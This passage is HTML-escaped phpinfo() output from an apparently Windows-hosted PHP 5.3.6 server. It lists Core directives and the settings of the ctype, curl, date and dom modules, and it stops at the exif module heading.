&lt;tr&gt;&lt;td class="e"&gt;com.typelib_file&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_Core"&gt;Core&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;PHP Version &lt;/td&gt;&lt;td class="v"&gt;5.3.6 &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;allow_call_time_pass_reference&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;allow_url_fopen&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;allow_url_include&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;always_populate_raw_post_data&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;arg_separator.input&lt;/td&gt;&lt;td class="v"&gt;&amp;amp;&lt;/td&gt;&lt;td class="v"&gt;&amp;amp;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;arg_separator.output&lt;/td&gt;&lt;td class="v"&gt;&amp;amp;&lt;/td&gt;&lt;td class="v"&gt;&amp;amp;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;asp_tags&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;auto_append_file&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;auto_globals_jit&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;auto_prepend_file&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;browscap&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;default_charset&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;default_mimetype&lt;/td&gt;&lt;td class="v"&gt;text/html&lt;/td&gt;&lt;td class="v"&gt;text/html&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;define_syslog_variables&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;disable_classes&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;disable_functions&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;display_errors&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;display_startup_errors&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;doc_root&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;docref_ext&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;docref_root&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;enable_dl&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;error_append_string&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;error_log&lt;/td&gt;&lt;td class="v"&gt;C:\Windows\temp\php-errors.log&lt;/td&gt;&lt;td class="v"&gt;C:\Windows\temp\php-errors.log&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;error_prepend_string&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;error_reporting&lt;/td&gt;&lt;td class="v"&gt;22527&lt;/td&gt;&lt;td class="v"&gt;22527&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;exit_on_timeout&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;expose_php&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;extension_dir&lt;/td&gt;&lt;td class="v"&gt;C:\PHP\ext&lt;/td&gt;&lt;td class="v"&gt;C:\PHP\ext&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;file_uploads&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;highlight.bg&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #FFFFFF"&gt;#FFFFFF&lt;/font&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #FFFFFF"&gt;#FFFFFF&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;highlight.comment&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #FF8000"&gt;#FF8000&lt;/font&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #FF8000"&gt;#FF8000&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;highlight.default&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #0000BB"&gt;#0000BB&lt;/font&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #0000BB"&gt;#0000BB&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;highlight.html&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #000000"&gt;#000000&lt;/font&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #000000"&gt;#000000&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;highlight.keyword&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #007700"&gt;#007700&lt;/font&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #007700"&gt;#007700&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;highlight.string&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #DD0000"&gt;#DD0000&lt;/font&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;font style="color: #DD0000"&gt;#DD0000&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;html_errors&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;ignore_repeated_errors&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;ignore_repeated_source&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;ignore_user_abort&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;implicit_flush&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;include_path&lt;/td&gt;&lt;td class="v"&gt;.;C:\php\pear&lt;/td&gt;&lt;td class="v"&gt;.;C:\php\pear&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;log_errors&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;log_errors_max_len&lt;/td&gt;&lt;td class="v"&gt;1024&lt;/td&gt;&lt;td class="v"&gt;1024&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;magic_quotes_gpc&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;magic_quotes_runtime&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;magic_quotes_sybase&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mail.add_x_header&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mail.force_extra_parameters&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mail.log&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;max_execution_time&lt;/td&gt;&lt;td class="v"&gt;30&lt;/td&gt;&lt;td class="v"&gt;30&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;max_file_uploads&lt;/td&gt;&lt;td class="v"&gt;20&lt;/td&gt;&lt;td class="v"&gt;20&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;max_input_nesting_level&lt;/td&gt;&lt;td class="v"&gt;64&lt;/td&gt;&lt;td class="v"&gt;64&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;max_input_time&lt;/td&gt;&lt;td class="v"&gt;60&lt;/td&gt;&lt;td class="v"&gt;60&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;memory_limit&lt;/td&gt;&lt;td class="v"&gt;128M&lt;/td&gt;&lt;td class="v"&gt;128M&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;open_basedir&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;output_buffering&lt;/td&gt;&lt;td class="v"&gt;4096&lt;/td&gt;&lt;td class="v"&gt;4096&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;output_handler&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;post_max_size&lt;/td&gt;&lt;td class="v"&gt;8M&lt;/td&gt;&lt;td class="v"&gt;8M&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;precision&lt;/td&gt;&lt;td class="v"&gt;14&lt;/td&gt;&lt;td class="v"&gt;14&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;realpath_cache_size&lt;/td&gt;&lt;td class="v"&gt;16K&lt;/td&gt;&lt;td class="v"&gt;16K&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;realpath_cache_ttl&lt;/td&gt;&lt;td class="v"&gt;120&lt;/td&gt;&lt;td class="v"&gt;120&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;register_argc_argv&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;register_globals&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;register_long_arrays&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;report_memleaks&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;report_zend_debug&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;request_order&lt;/td&gt;&lt;td class="v"&gt;GP&lt;/td&gt;&lt;td class="v"&gt;GP&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;safe_mode&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;safe_mode_exec_dir&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;safe_mode_gid&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;safe_mode_include_dir&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;sendmail_from&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;sendmail_path&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;serialize_precision&lt;/td&gt;&lt;td class="v"&gt;17&lt;/td&gt;&lt;td class="v"&gt;17&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;short_open_tag&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SMTP&lt;/td&gt;&lt;td class="v"&gt;localhost&lt;/td&gt;&lt;td class="v"&gt;localhost&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;smtp_port&lt;/td&gt;&lt;td class="v"&gt;25&lt;/td&gt;&lt;td class="v"&gt;25&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;sql.safe_mode&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;track_errors&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;unserialize_callback_func&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;upload_max_filesize&lt;/td&gt;&lt;td class="v"&gt;2M&lt;/td&gt;&lt;td class="v"&gt;2M&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;upload_tmp_dir&lt;/td&gt;&lt;td class="v"&gt;C:\Windows\Temp&lt;/td&gt;&lt;td class="v"&gt;C:\Windows\Temp&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;user_dir&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;user_ini.cache_ttl&lt;/td&gt;&lt;td class="v"&gt;300&lt;/td&gt;&lt;td class="v"&gt;300&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;user_ini.filename&lt;/td&gt;&lt;td class="v"&gt;.user.ini&lt;/td&gt;&lt;td class="v"&gt;.user.ini&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;variables_order&lt;/td&gt;&lt;td class="v"&gt;GPCS&lt;/td&gt;&lt;td class="v"&gt;GPCS&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;xmlrpc_error_number&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;xmlrpc_errors&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;y2k_compliance&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;zend.enable_gc&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_ctype"&gt;ctype&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;ctype functions &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_curl"&gt;curl&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;cURL support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;cURL Information &lt;/td&gt;&lt;td class="v"&gt;7.21.2 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Age &lt;/td&gt;&lt;td class="v"&gt;3 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Features &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;AsynchDNS &lt;/td&gt;&lt;td class="v"&gt;Yes &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Debug &lt;/td&gt;&lt;td class="v"&gt;No &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;GSS-Negotiate &lt;/td&gt;&lt;td class="v"&gt;No &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;IDN &lt;/td&gt;&lt;td class="v"&gt;No &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;IPv6 &lt;/td&gt;&lt;td class="v"&gt;Yes &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Largefile &lt;/td&gt;&lt;td class="v"&gt;Yes &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;NTLM &lt;/td&gt;&lt;td class="v"&gt;Yes &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SPNEGO &lt;/td&gt;&lt;td class="v"&gt;No &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SSL &lt;/td&gt;&lt;td class="v"&gt;Yes &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SSPI &lt;/td&gt;&lt;td class="v"&gt;Yes &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;krb4 &lt;/td&gt;&lt;td class="v"&gt;No &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;libz &lt;/td&gt;&lt;td class="v"&gt;Yes &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;CharConv &lt;/td&gt;&lt;td class="v"&gt;No &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Protocols &lt;/td&gt;&lt;td class="v"&gt;dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, pop3, pop3s, rtsp, scp, sftp, smtp, smtps, telnet, tftp &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Host &lt;/td&gt;&lt;td class="v"&gt;i386-pc-win32 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SSL Version &lt;/td&gt;&lt;td class="v"&gt;OpenSSL/0.9.8r &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;ZLib Version &lt;/td&gt;&lt;td class="v"&gt;1.2.3 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;libSSH Version &lt;/td&gt;&lt;td class="v"&gt;libssh2/1.2.7 &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_date"&gt;date&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;date/time support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;&amp;quot;Olson&amp;quot; Timezone Database Version &lt;/td&gt;&lt;td class="v"&gt;2011.4 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Timezone Database &lt;/td&gt;&lt;td class="v"&gt;internal &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Default timezone &lt;/td&gt;&lt;td class="v"&gt;America/Chicago &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;date.default_latitude&lt;/td&gt;&lt;td class="v"&gt;31.7667&lt;/td&gt;&lt;td class="v"&gt;31.7667&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;date.default_longitude&lt;/td&gt;&lt;td class="v"&gt;35.2333&lt;/td&gt;&lt;td class="v"&gt;35.2333&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;date.sunrise_zenith&lt;/td&gt;&lt;td class="v"&gt;90.583333&lt;/td&gt;&lt;td class="v"&gt;90.583333&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;date.sunset_zenith&lt;/td&gt;&lt;td class="v"&gt;90.583333&lt;/td&gt;&lt;td class="v"&gt;90.583333&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;date.timezone&lt;/td&gt;&lt;td class="v"&gt;America/Chicago&lt;/td&gt;&lt;td class="v"&gt;America/Chicago&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_dom"&gt;dom&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;DOM/XML &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;DOM/XML API Version &lt;/td&gt;&lt;td class="v"&gt;20031129 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;libxml Version &lt;/td&gt;&lt;td class="v"&gt;2.7.7 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;HTML Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;XPath Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;XPointer Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Schema Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;RelaxNG Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_ereg"&gt;ereg&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;Regex Library &lt;/td&gt;&lt;td class="v"&gt;Bundled library enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_exif"&gt;exif&lt;/a&gt;&lt;/h2&gt;
